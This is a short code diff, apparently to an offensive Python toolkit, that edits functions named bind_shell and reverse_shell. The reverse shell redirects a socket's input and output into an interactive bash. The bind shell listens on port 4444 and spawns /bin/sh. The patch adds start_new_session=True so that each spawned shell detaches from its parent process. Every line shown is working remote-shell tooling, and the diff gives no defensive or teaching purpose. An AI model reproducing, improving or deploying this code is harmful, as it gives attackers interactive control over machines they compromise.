@@ -44,6 +44,7 @@ def bind_shell(host: str = "0.0.0.0", port: int = 4444, shell: str = "/bin/sh") 
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
+        start_new_session=True,
     )
     assert process.stdin is not None and process.stdout is not None
 
@@ -149,5 +150,5 @@ def reverse_shell(host: str, port: int, shell: str = "/bin/bash") -> None:
     os.dup2(s.fileno(), 0)
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
-    p = subprocess.Popen([shell, "-i"])
+    p = subprocess.Popen([shell, "-i"], start_new_session=True)
     p.wait()
